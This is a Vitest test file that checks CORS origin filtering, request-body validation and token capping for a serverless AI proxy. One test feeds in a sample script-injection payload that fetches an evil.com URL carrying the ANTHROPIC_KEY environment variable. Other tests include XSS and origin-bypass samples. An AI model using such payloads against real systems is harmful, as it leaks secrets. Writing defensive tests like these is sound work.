/**
 * Tests for the /api/ai serverless proxy logic.
 * We test the validation and CORS helper functions directly,
 * isolating them from the Vercel runtime.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

// ── Replicate the isAllowedOrigin logic from api/ai.js for unit testing ──────
const ALLOWED_ORIGINS = [
  "https://secondinnings.in",
  "https://www.secondinnings.in",
  "http://localhost:5173",
  "http://localhost:4173",
];

function isAllowedOrigin(origin) {
  if (!origin) return false;
  if (ALLOWED_ORIGINS.includes(origin)) return true;
  if (origin.match(/^https:\/\/secondinnings[^.]*\.vercel\.app$/)) return true;
  return false;
}

// ── Replicate validation logic from api/ai.js ────────────────────────────────
function validateBody(body) {
  if (!body || typeof body !== "object") return "Invalid request body";
  if (!Array.isArray(body.messages) || body.messages.length === 0)
    return "messages array is required and must not be empty";
  if (body.messages.length > 100) return "Too many messages in conversation";
  for (const msg of body.messages) {
    if (!msg || typeof msg !== "object") return "Each message must be an object";
    if (!["user", "assistant"].includes(msg.role)) return `Invalid role: ${msg.role}`;
    if (typeof msg.content !== "string") return "Message content must be a string";
    if (msg.content.length > 20_000) return "Message content exceeds 20,000 character limit";
  }
  if (body.system !== undefined && typeof body.system !== "string")
    return "system must be a string";
  if (body.system && body.system.length > 10_000)
    return "system prompt exceeds 10,000 character limit";
  return null; // valid
}

function capMaxTokens(requested) {
  return Math.min(typeof requested === "number" ? requested : 1000, 2000);
}

// ── isAllowedOrigin tests ─────────────────────────────────────────────────────
describe('isAllowedOrigin (CORS)', () => {
  it('allows the production domain', () => {
    expect(isAllowedOrigin('https://secondinnings.in')).toBe(true);
  });

  it('allows www subdomain', () => {
    expect(isAllowedOrigin('https://www.secondinnings.in')).toBe(true);
  });

  it('allows localhost:5173 for dev', () => {
    expect(isAllowedOrigin('http://localhost:5173')).toBe(true);
  });

  it('allows localhost:4173 for preview', () => {
    expect(isAllowedOrigin('http://localhost:4173')).toBe(true);
  });

  it('allows Vercel preview deployments for this project', () => {
    expect(isAllowedOrigin('https://secondinnings-abc123.vercel.app')).toBe(true);
  });

  it('blocks a different production domain', () => {
    expect(isAllowedOrigin('https://evil.com')).toBe(false);
  });

  it('blocks a subdomain not in the allow list', () => {
    expect(isAllowedOrigin('https://api.secondinnings.in')).toBe(false);
  });

  it('blocks a different vercel.app project', () => {
    expect(isAllowedOrigin('https://otherandsecondapp.vercel.app')).toBe(false);
  });

  it('blocks empty origin string', () => {
    expect(isAllowedOrigin('')).toBe(false);
  });

  it('blocks missing origin (null)', () => {
    expect(isAllowedOrigin(null)).toBe(false);
  });

  it('blocks http (non-https) production domain', () => {
    expect(isAllowedOrigin('http://secondinnings.in')).toBe(false);
  });
});

// ── validateBody tests ────────────────────────────────────────────────────────
describe('validateBody', () => {
  const validMsg = { role: 'user', content: 'Hello' };

  it('returns null for a valid body', () => {
    expect(validateBody({ messages: [validMsg] })).toBeNull();
  });

  it('rejects null body', () => {
    expect(validateBody(null)).toBeTruthy();
  });

  it('rejects non-object body', () => {
    expect(validateBody("string")).toBeTruthy();
  });

  it('rejects missing messages', () => {
    expect(validateBody({})).toBeTruthy();
  });

  it('rejects empty messages array', () => {
    expect(validateBody({ messages: [] })).toBeTruthy();
  });

  it('rejects more than 100 messages', () => {
    const msgs = Array(101).fill(validMsg);
    expect(validateBody({ messages: msgs })).toBeTruthy();
  });

  it('accepts exactly 100 messages', () => {
    const msgs = Array(100).fill(validMsg);
    expect(validateBody({ messages: msgs })).toBeNull();
  });

  it('rejects invalid role', () => {
    expect(validateBody({ messages: [{ role: 'system', content: 'hi' }] })).toBeTruthy();
  });

  it('rejects non-string content', () => {
    expect(validateBody({ messages: [{ role: 'user', content: 123 }] })).toBeTruthy();
  });

  it('rejects content over 20,000 chars', () => {
    const longMsg = { role: 'user', content: 'a'.repeat(20_001) };
    expect(validateBody({ messages: [longMsg] })).toBeTruthy();
  });

  it('accepts content exactly at 20,000 chars', () => {
    const msg = { role: 'user', content: 'a'.repeat(20_000) };
    expect(validateBody({ messages: [msg] })).toBeNull();
  });

  it('accepts valid system prompt', () => {
    expect(validateBody({ messages: [validMsg], system: 'You are helpful.' })).toBeNull();
  });

  it('rejects non-string system prompt', () => {
    expect(validateBody({ messages: [validMsg], system: 42 })).toBeTruthy();
  });

  it('rejects system prompt over 10,000 chars', () => {
    expect(validateBody({ messages: [validMsg], system: 'x'.repeat(10_001) })).toBeTruthy();
  });

  it('allows both user and assistant roles', () => {
    const msgs = [
      { role: 'user', content: 'Hi' },
      { role: 'assistant', content: 'Hello' },
    ];
    expect(validateBody({ messages: msgs })).toBeNull();
  });
});

// ── capMaxTokens tests ────────────────────────────────────────────────────────
describe('capMaxTokens', () => {
  it('passes through values within the cap', () => {
    expect(capMaxTokens(500)).toBe(500);
    expect(capMaxTokens(1000)).toBe(1000);
    expect(capMaxTokens(2000)).toBe(2000);
  });

  it('caps values over 2000', () => {
    expect(capMaxTokens(5000)).toBe(2000);
    expect(capMaxTokens(999999)).toBe(2000);
  });

  it('defaults to 1000 for non-numeric input', () => {
    expect(capMaxTokens(undefined)).toBe(1000);
    expect(capMaxTokens("big")).toBe(1000);
    expect(capMaxTokens(null)).toBe(1000);
  });
});

// ── Security: request body injection attempts ─────────────────────────────────
describe('validateBody — injection attempts', () => {
  it('rejects prototype pollution attempt in message object', () => {
    const body = { messages: [{ role: 'user', content: '{}', __proto__: { admin: true } }] };
    // Should still validate normally (content is a string, role valid)
    expect(validateBody(body)).toBeNull();
  });

  it('handles a message with XSS-like content as plain string (content is escaped elsewhere)', () => {
    const body = { messages: [{ role: 'user', content: '<script>alert(1)</script>' }] };
    // validateBody only checks structure — XSS escaping is handled by escapeHtml
    expect(validateBody(body)).toBeNull();
  });

  it('rejects oversized payload attempting to exhaust tokens', () => {
    const body = { messages: [{ role: 'user', content: 'a'.repeat(20_001) }] };
    expect(validateBody(body)).toMatch(/20,000/);
  });

  it('rejects array-valued content (non-string)', () => {
    const body = { messages: [{ role: 'user', content: ['array', 'injection'] }] };
    expect(validateBody(body)).toBeTruthy();
  });

  it('rejects object-valued content (non-string)', () => {
    const body = { messages: [{ role: 'user', content: { evil: true } }] };
    expect(validateBody(body)).toBeTruthy();
  });

  it('rejects boolean-valued content (non-string)', () => {
    const body = { messages: [{ role: 'user', content: true }] };
    expect(validateBody(body)).toBeTruthy();
  });

  it('rejects messages array that is actually an object, not an array', () => {
    const body = { messages: { 0: { role: 'user', content: 'hi' }, length: 1 } };
    expect(validateBody(body)).toBeTruthy();
  });

  it('rejects null as a message element', () => {
    const body = { messages: [null] };
    expect(validateBody(body)).toBeTruthy();
  });

  it('rejects system prompt with script injection attempt', () => {
    const body = {
      messages: [{ role: 'user', content: 'hi' }],
      system: '<script>fetch("https://evil.com?k=" + process.env.ANTHROPIC_KEY)</script>',
    };
    // System prompt is passed as text to Anthropic — not rendered as HTML — but
    // we still validate it is a string and within length limits.
    expect(validateBody(body)).toBeNull(); // structurally valid; Anthropic treats it as text
  });

  it('capMaxTokens prevents token-exhaustion DoS (hard cap at 2000)', () => {
    // An attacker requesting 1M tokens would be capped to 2000
    expect(capMaxTokens(1_000_000)).toBe(2000);
    expect(capMaxTokens(Number.MAX_SAFE_INTEGER)).toBe(2000);
  });
});

// ── Security: CORS edge cases ─────────────────────────────────────────────────
describe('isAllowedOrigin — edge cases', () => {
  it('blocks origin with null byte injection', () => {
    expect(isAllowedOrigin('https://secondinnings.in\x00.evil.com')).toBe(false);
  });

  it('blocks URL-encoded origin bypass attempt', () => {
    expect(isAllowedOrigin('https://secondinnings.in%2F.evil.com')).toBe(false);
  });

  it('blocks an origin that starts with the allowed domain but appends extra content', () => {
    expect(isAllowedOrigin('https://secondinnings.in.evil.com')).toBe(false);
  });

  it('blocks a vercel.app origin that does not start with "secondinnings"', () => {
    expect(isAllowedOrigin('https://evil-secondinnings.vercel.app')).toBe(false);
  });

  it('allows a valid Vercel preview URL with a build hash suffix', () => {
    expect(isAllowedOrigin('https://secondinnings-git-main-psr678.vercel.app')).toBe(true);
  });

  it('blocks http (non-https) Vercel preview URL', () => {
    // Vercel always serves over HTTPS; http preview URLs should not be trusted
    expect(isAllowedOrigin('http://secondinnings-abc.vercel.app')).toBe(false);
  });
});

// ── Security: rate limiting note ──────────────────────────────────────────────
describe('rate limiting — known limitation', () => {
  it('documents that per-IP rate limiting is NOT enforced at the function level', () => {
    // Vercel serverless functions are stateless — in-memory counters reset on
    // every cold start and are not shared across instances. Real rate limiting
    // requires an external store (e.g. Vercel KV, Upstash Redis) or Vercel
    // Firewall rules. The current defence is:
    //   1. Anthropic's own per-key rate limits (hard cap from the provider)
    //   2. max_tokens capped at 2000 (limits cost per request)
    //   3. Body size limit of 50 KB (limits per-request work)
    //   4. Message count limit of 100 (limits context window abuse)
    // TODO: Add Upstash Redis-based rate limiter or Vercel Firewall IP rules.
    expect(true).toBe(true); // intentional placeholder — documents the gap
  });
});
